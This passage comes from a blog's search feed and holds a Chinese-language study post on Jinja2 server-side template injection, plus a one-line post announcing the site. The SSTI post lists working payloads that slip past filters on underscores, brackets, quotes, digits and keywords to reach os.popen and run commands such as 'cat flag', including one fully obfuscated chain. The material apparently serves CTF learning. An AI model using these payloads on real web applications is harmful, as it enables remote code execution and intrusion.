class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]&#125;&#125;</span><span class="language-xml"> =</span><span class="hljs-template-variable">&#123;&#123;().__class__&#125;&#125;</span><br></code></pre></td></tr></table></figure>使用{%set%}构造下划线<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">&#123;% <span class="hljs-keyword">set</span> <span class="hljs-keyword">sb</span> = dict(aaaaaaaaaaaaaaaaaa=<span class="hljs-keyword">a</span>) | <span class="hljs-keyword">join</span> | <span class="hljs-built_in">count</span> %&#125;<br>&#123;% <span class="hljs-keyword">set</span> <span class="hljs-keyword">pop</span>=dict(<span class="hljs-keyword">pop</span>=<span class="hljs-keyword">a</span>)|<span class="hljs-keyword">join</span>%&#125;<br>&#123;% <span class="hljs-keyword">set</span> xiahuaxian = (lipsum | <span class="hljs-built_in">string</span> | <span class="hljs-keyword">list</span>) | attr(<span class="hljs-keyword">pop</span>)(<span class="hljs-keyword">sb</span>) %&#125;<br><br>小标按照实际情况写<br></code></pre></td></tr></table></figure><h2 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过 []"></a>绕过 []</h2><p>经常有中括号被ban的情况出现，这个时候可以使用<code>pop</code>或<code>__getitem__()</code>代替索引中的&#96;[]，它的作用简单说就是可以把中括号转换为括号的形式，举个例子</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__bases__</span>[0]=<span class="hljs-emphasis">__bases__</span>.<span class="hljs-emphasis">__getitem__</span>(0)<br></code></pre></td></tr></table></figure>## 绕过{{}}有时候为了防止SSTI，可能程序员会ban掉{{，这个时候我们可以利用jinja2的语法，用{%来进行RCE，举个例子我们平常使用的payload<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;dir&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>修改后的payload</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">&#123;%print(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>]. <span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">138</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read())%&#125;<br></code></pre></td></tr></table></figure><p>也可以借助for循环和if语句来执行命令</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&#123;%for i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%print i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;<br></code></pre></td></tr></table></figure><h2 id="绕过单引号双引号-传参绕过"><a href="#绕过单引号双引号-传参绕过" class="headerlink" title="绕过单引号双引号   传参绕过"></a>绕过单引号双引号   传参绕过</h2><p>过滤了单、双引号，有两种方法绕过</p><p>request绕过</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">#post</span><br><span class="language-xml"># __builtins__</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[80].__init__.__globals__.__builtins__[request.values.arg1](<span class="hljs-name">request.values.arg2</span>).popen(<span class="hljs-name">request.values.arg3</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=__import__,arg2=os,arg3=popen</span><br><span class="language-xml"></span><br><span class="language-xml"># popen</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[132].__init__.__globals__[request.values.arg1](<span class="hljs-name">request.values.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br><span class="language-xml"># os</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[213].__init__.__globals__[request.values.arg1].popen(<span class="hljs-name">request.values.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#cookie</span><br><span class="language-xml"># popen</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[132].__init__.__globals__[request.cookies.arg1](<span class="hljs-name">request.cookies.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Cookie:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p>chr()绕过</p><p>先找出chr函数位置</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&#123;&#123;().<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__mro__</span>[-1].<span class="hljs-emphasis">__subclasses__</span>()[0].<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span>.<span class="hljs-emphasis">__builtins__</span>.chr&#125;&#125;<br></code></pre></td></tr></table></figure>{%set%}拼接绕过   适合大部分过滤<h2 id="绕过args"><a href="#绕过args" class="headerlink" title="绕过args"></a>绕过args</h2><p>当使用args的方法绕过<code>&#39;</code>和<code>&quot;</code>时，可能遇见args被ban的情况，这个时候可以采用<code>request.cookies</code>和<code>request.values</code>，他们利用的方式大同小异，示例如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">GET:&#123;&#123;url_for.__globals__<span class="hljs-selector-attr">[request.cookies.a]</span>&#125;&#125;<br>COOkie: <span class="hljs-string">&quot;a&quot;</span> :<span class="hljs-string">&#x27;__builtins__&#x27;</span><br></code></pre></td></tr></table></figure>使用{%set%}拼接绕过<h2 id="绕过数字"><a href="#绕过数字" class="headerlink" title="绕过数字"></a>绕过数字</h2><p>有时候可能会遇见数字<code>0-9</code>被ban的情况，这个时候我们可以通过count来得到数字，举个例子</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">dict</span>(<span class="hljs-name">e</span>=a)|join|count)&#125;&#125;</span><span class="language-xml">  #获得字典拼接后字符串的长度</span><br></code></pre></td></tr></table></figure><h2 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h2><p>有时候可能遇见<code>class</code>、<code>base</code>这种关键词被绕过的情况，我们这个时候通常使用的绕过方式是使用join拼接从而实现绕过，举个例子</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">dict</span>(<span class="hljs-name">__in</span>=a,<span class="hljs-attr">it__</span>=a)|join&#125;&#125;</span><span class="language-xml">  =__init__</span><br></code></pre></td></tr></table></figure><h1 id="SSTI实战"><a href="#SSTI实战" class="headerlink" title="SSTI实战"></a>SSTI实战</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">目的<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br>payload:<br>&#123;% <span class="hljs-built_in">set</span> s = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> si = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> sb = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> <span class="hljs-attribute">pop</span>=dict(pop=a)|join%&#125;<br>&#123;% <span class="hljs-built_in">set</span> xiahuaxian = (lipsum | string | list) | attr(pop)(sb) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> a = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">glo</span>=a, <span class="hljs-attribute">bals</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> b = dict(<span class="hljs-attribute">o</span>=a, <span class="hljs-attribute">s</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> c = dict(<span class="hljs-attribute">po</span>=a, <span class="hljs-attribute">pen</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> d = dict(<span class="hljs-attribute">re</span>=a, <span class="hljs-attribute">ad</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> e = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">get</span>=a, <span class="hljs-attribute">item</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> f = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">buil</span>=a, <span class="hljs-attribute">tins</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> ch = dict(<span class="hljs-attribute">ch</span>=a, <span class="hljs-attribute">r</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> chh = lipsum | attr(a) | attr(e)(f) | attr(e)(ch) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> cmd = (dict(<span class="hljs-attribute">ca</span>=a, <span class="hljs-attribute">t</span>=a) | join, chh(s), chh(si), dict(<span class="hljs-attribute">ap</span>=a, <span class="hljs-attribute">p</span>=a) | join, chh(si), dict(<span class="hljs-attribute">fl</span>=a, <span class="hljs-attribute">ag</span>=a) | join) | join %&#125;<br>&#123;&#123; lipsum | attr(a) | attr(e)(b) | attr(c)(cmd) | attr(d)() &#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>开站</title>
    <link href="/tuyi/2025/01/12/%E5%BC%80%E7%AB%99/"/>
    <url>/tuyi/2025/01/12/%E5%BC%80%E7%AB%99/</url>
    
    <content type="html"><![CDATA[<p>搭建一个小站，纪录自己的学习和分享一些东西</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
